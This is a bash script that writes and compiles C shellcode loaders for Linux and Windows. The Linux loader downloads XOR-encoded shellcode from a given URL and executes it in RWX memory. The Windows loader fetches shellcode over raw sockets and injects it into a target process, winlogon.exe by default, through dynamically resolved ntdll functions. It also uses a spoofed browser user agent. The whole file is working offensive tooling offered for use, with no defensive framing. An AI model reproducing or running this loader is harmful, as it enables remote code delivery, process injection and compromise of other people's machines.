#!/bin/bash
TARGET=""
URL=""
PROCESS_NAME="winlogon.exe"
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
TIMEOUT=15
MAX_SIZE=2097152
XOR_KEY=0x42

usage() {
    echo "Usage: $0 --target <linux|windows> --url <url> [--key <xor_key>]"
    echo "For windows target, also specify: --process-name <process.exe>"
    exit 1
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --target)
            TARGET="$2"
            shift 2
            ;;
        --url)
            URL="$2"
            shift 2
            ;;
        --key)
            XOR_KEY="$2"
            shift 2
            ;;
        --process-name)
            PROCESS_NAME="$2"
            shift 2
            ;;
        *)
            echo "Opción desconocida: $1"
            exit 1
            ;;
    esac
done

if [[ -z "$TARGET" || -z "$URL" ]]; then
    usage
fi
if [[ "$TARGET" == "windows" && -z "$PROCESS_NAME" ]]; then
    echo "Error: --process-name is required for windows target."
    usage
fi
[[ "$TARGET" != "linux" && "$TARGET" != "windows" ]] && { echo "Target must be 'linux' or 'windows'"; exit 1; }

ESCAPED_URL=$(printf '%s' "$URL" | sed 's/\\/\\\\/g; s/"/\\"/g')
ESCAPED_UA=$(printf '%s' "$USER_AGENT" | sed 's/\\/\\\\/g; s/"/\\"/g')

cat > Makefile << 'EOF'
.PHONY: linux windows clean
linux: loader_linux.c
        gcc loader_linux.c -o loader_linux -lcurl -s -O2
windows: loader_windows.c
        x86_64-w64-mingw32-gcc loader_windows.c -o loader_windows.exe -lws2_32 -s -O2
clean:
        rm -f loader_linux loader_windows.exe loader_linux.c loader_windows.c
EOF

case $TARGET in
    linux)
        ESCAPED_URL=$(printf '%s' "$URL" | sed 's/\\/\\\\/g; s/"/\\"/g')
        ESCAPED_UA=$(printf '%s' "$USER_AGENT" | sed 's/\\/\\\\/g; s/"/\\"/g')
        cat > loader_linux.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <curl/curl.h>
#define XOR_KEY __XOR_KEY__
const char* SHELLCODE_URL = "__SHELLCODE_URL__";
const char* USER_AGENT     = "__USER_AGENT__";
const long TIMEOUT         = __TIMEOUT__;
const size_t MAX_SIZE      = __MAX_SIZE__;
struct MemoryStruct {
    char* memory;
    size_t size;
};
static size_t WriteMemoryCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct* mem = (struct MemoryStruct*)userp;
    if (mem->size + realsize >= MAX_SIZE) return 0;
    char* ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) return 0;
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}
int main() {
    CURL* curl;
    CURLcode res;
    struct MemoryStruct chunk = {0};
    chunk.memory = malloc(1);
    chunk.size = 0;
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (!curl) {
        free(chunk.memory);
        return 1;
    }
    curl_easy_setopt(curl, CURLOPT_URL, SHELLCODE_URL);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &chunk);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, USER_AGENT);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, TIMEOUT);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        curl_easy_cleanup(curl);
        free(chunk.memory);
        curl_global_cleanup();
        return 1;
    }
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    const char* text = chunk.memory;
    size_t len = chunk.size;
    unsigned char* shellcode = malloc(1024);
    size_t sc_len = 0;
    size_t capacity = 1024;
    for (size_t i = 0; i < len - 3; i++) {
        if (text[i] == '\\' && text[i+1] == 'x' && i+3 < len) {
            char hex[3] = { text[i+2], text[i+3], '\0' };
            char* end;
            long val = strtol(hex, &end, 16);
            if (end == hex + 2 && val >= 0 && val <= 255) {
                if (sc_len >= capacity) {
                    capacity *= 2;
                    unsigned char* tmp = realloc(shellcode, capacity);
                    if (!tmp) { free(shellcode); free(chunk.memory); return 1; }
                    shellcode = tmp;
                }
                shellcode[sc_len++] = (unsigned char)(val ^ XOR_KEY);
                i += 3;
            }
        }
    }
    free(chunk.memory);
    if (sc_len == 0) {
        free(shellcode);
        return 1;
    }
    printf("Loaded %zu bytes of shellcode\n", sc_len);
    void* mem = mmap(NULL, sc_len, PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        free(shellcode);
        return 1;
    }
    memcpy(mem, shellcode, sc_len);
    free(shellcode);
    ((void(*)())mem)();
    sleep(30);
    return 0;
}
EOF
        sed -i "s|__XOR_KEY__|$XOR_KEY|g" loader_linux.c
        sed -i "s|__SHELLCODE_URL__|$ESCAPED_URL|g" loader_linux.c
        sed -i "s|__USER_AGENT__|$ESCAPED_UA|g" loader_linux.c
        sed -i "s|__TIMEOUT__|$TIMEOUT|g" loader_linux.c
        sed -i "s|__MAX_SIZE__|$MAX_SIZE|g" loader_linux.c
        echo "[+] Generated loader_linux.c"
        make linux
        ;;

    windows)
        cat > loader_windows.c << 'EOF'
// inject_remote_download.c
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#pragma comment(lib, "ws2_32.lib")
#define XOR_KEY __XOR_KEY__
const char* SHELLCODE_URL = "$ESCAPED_URL";
const char* PROCESS_NAME = "$PROCESS_NAME";
const char* USER_AGENT     = "$ESCAPED_UA";
const long TIMEOUT         = $TIMEOUT;
const size_t MAX_RESPONSE  = $MAX_SIZE;
#ifndef _NTDEF_H
#define _NTDEF_H
typedef long NTSTATUS;
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS 0x00000000L
#endif
#ifndef NTAPI
#define NTAPI __stdcall
#endif
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
typedef const OBJECT_ATTRIBUTES *PCOBJECT_ATTRIBUTES;
#define InitializeObjectAttributes(p, n, a, r, s) \
    do { \
        (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
        (p)->RootDirectory = r; \
        (p)->ObjectName = n; \
        (p)->Attributes = a; \
        (p)->SecurityDescriptor = s; \
        (p)->SecurityQualityOfService = NULL; \
    } while(0)
#endif
#ifndef _PS_ATTRIBUTE_LIST_DEFINED
#define _PS_ATTRIBUTE_LIST_DEFINED
typedef struct _PS_ATTRIBUTE {
    ULONG_PTR Attribute;
    SIZE_T    Size;
    union {
        ULONG_PTR Value;
        PVOID     ValuePtr;
    } u1;
    PSIZE_T   ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
#endif
typedef NTSTATUS (NTAPI *NtOpenProcess_)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId);
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);
typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten);
typedef NTSTATUS (NTAPI *NtCreateThreadEx_)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PCOBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList);
typedef NTSTATUS (NTAPI *NtClose_)(
    HANDLE Handle);
static NtOpenProcess_           NtOpenProcessF = NULL;
static NtAllocateVirtualMemory_ NtAllocateVirtualMemoryF = NULL;
static NtWriteVirtualMemory_    NtWriteVirtualMemoryF = NULL;
static NtCreateThreadEx_        NtCreateThreadExF = NULL;
static NtClose_                 NtCloseF = NULL;
#define populatePrototype(x, dll) \
    do { Nt##x##F = (Nt##x##_) GetProcAddress(dll, "Nt" #x); } while(0)
typedef struct {
    char* buffer;
    size_t size;
    size_t capacity;
} Buffer;
int init_winsock() {
    WSADATA wsa;
    return WSAStartup(MAKEWORD(2,2), &wsa) == 0;
}
int buffer_append(Buffer* b, const char* data, size_t len) {
    if (b->size + len > b->capacity) {
        size_t new_cap = b->capacity ? b->capacity * 2 : 4096;
        while (new_cap < b->size + len) new_cap *= 2;
        char* new_buf = realloc(b->buffer, new_cap);
        if (!new_buf) return 0;
        b->buffer = new_buf;
        b->capacity = new_cap;
    }
    memcpy(b->buffer + b->size, data, len);
    b->size += len;
    return 1;
}
int extract_shellcode(const char* input, size_t len, unsigned char** out) {
    *out = NULL;
    unsigned char* sc = malloc(1024);
    size_t capacity = 1024;
    size_t count = 0;
    for (size_t i = 0; i < len - 3; i++) {
        if (input[i] == '\\' && input[i+1] == 'x' && i+3 < len) {
            char hex[3] = { input[i+2], input[i+3], '\0' };
            char* end;
            long val = strtol(hex, &end, 16);
            if (end == hex + 2 && val >= 0 && val <= 255) {
                if (count >= capacity) {
                    capacity *= 2;
                    unsigned char* tmp = realloc(sc, capacity);
                    if (!tmp) { free(sc); return -1; }
                    sc = tmp;
                }
                sc[count++] = (unsigned char)(val ^ XOR_KEY);
                i += 3;
            }
        }
    }
    if (count == 0) { free(sc); return 0; }
    *out = sc;
    return count;
}
DWORD get_pid_by_name(const char* proc_name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, proc_name) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return 0;
}
int main() {
    if (!init_winsock()) {
        return 1;
    }
    const char* proto = strstr(SHELLCODE_URL, "://");
    if (!proto) return 1;
    proto += 3;
    const char* path = strchr(proto, '/');
    if (!path) path = "/";
    size_t path_len = strlen(path);
    char host[256] = {0};
    int port = 80;
    size_t host_len = path - proto;
    if (host_len >= sizeof(host)) host_len = sizeof(host) - 1;
    strncpy(host, proto, host_len);
    char* colon = strchr(host, ':');
    if (colon) {
        port = atoi(colon + 1);
        *colon = '\0';
    }
    struct hostent* he = gethostbyname(host);
    if (!he) return 1;
    struct in_addr* addr = (struct in_addr*)he->h_addr_list[0];
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return 1;
    struct sockaddr_in serv_addr = {0};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    serv_addr.sin_addr = *addr;
    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    char request[1024];
    snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, host, port, USER_AGENT);
    send(sock, request, strlen(request), 0);
    Buffer response = {0};
    char buffer[4096];
    int bytes;
    while ((bytes = recv(sock, buffer, sizeof(buffer)-1, 0)) > 0) {
        buffer[bytes] = '\0';
        if (!buffer_append(&response, buffer, bytes)) break;
    }
    closesocket(sock);
    WSACleanup();
    char* body = strstr(response.buffer, "\r\n\r\n");
    if (!body) {
        free(response.buffer);
        return 1;
    }
    body += 4;
    unsigned char* shellcode;
    int sc_len = extract_shellcode(body, response.buffer + response.size - body, &shellcode);
    free(response.buffer);
    if (sc_len <= 0) {
        return 1;
    }
    DWORD pid = get_pid_by_name(PROCESS_NAME);
    if (pid == 0) {
        fprintf(stderr, "No se encontró el proceso: %s\n", PROCESS_NAME);
        free(shellcode);
        return 1;
    }
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        free(shellcode);
        return 1;
    }
    populatePrototype(OpenProcess, ntdll);
    populatePrototype(AllocateVirtualMemory, ntdll);
    populatePrototype(WriteVirtualMemory, ntdll);
    populatePrototype(CreateThreadEx, ntdll);
    populatePrototype(Close, ntdll);
    if (!NtOpenProcessF || !NtAllocateVirtualMemoryF || !NtWriteVirtualMemoryF ||
        !NtCreateThreadExF || !NtCloseF) {
        free(shellcode);
        return 1;
    }
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttrs;
    InitializeObjectAttributes(&objAttrs, NULL, 0, NULL, NULL);
    CLIENT_ID clientId = { (HANDLE)(ULONG_PTR)pid, NULL };
    NTSTATUS status = NtOpenProcessF(&hProcess,
                                     PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
                                     &objAttrs, &clientId);
    if (status != STATUS_SUCCESS) {
        free(shellcode);
        return 1;
    }
    SIZE_T size = sc_len;
    PVOID remoteMem = NULL;
    status = NtAllocateVirtualMemoryF(hProcess, &remoteMem, 0, &size,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS) {
        NtCloseF(hProcess);
        free(shellcode);
        return 1;
    }
    status = NtWriteVirtualMemoryF(hProcess, remoteMem, shellcode, sc_len, NULL);
    free(shellcode);
    if (status != STATUS_SUCCESS) {
        NtCloseF(hProcess);
        return 1;
    }
    HANDLE hThread = NULL;
    status = NtCreateThreadExF(&hThread, THREAD_ALL_ACCESS, &objAttrs, hProcess,
                               remoteMem, NULL, 0, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        NtCloseF(hProcess);
        return 1;
    }
    NtCloseF(hThread);
    NtCloseF(hProcess);
    printf("Inyección exitosa en PID: %lu\n", pid);
    return 0;
}
EOF
        sed -i "s|__XOR_KEY__|$XOR_KEY|g" loader_windows.c
        sed -i "s|\$ESCAPED_URL|$ESCAPED_URL|g" loader_windows.c
        sed -i "s|\$PROCESS_NAME|$PROCESS_NAME|g" loader_windows.c
        sed -i "s|\$ESCAPED_UA|$ESCAPED_UA|g" loader_windows.c
        sed -i "s|\$TIMEOUT|$TIMEOUT|g" loader_windows.c
        sed -i "s|\$MAX_SIZE|$MAX_SIZE|g" loader_windows.c
        echo "[+] Generated loader_windows.c"
        make windows
        ;;
esac
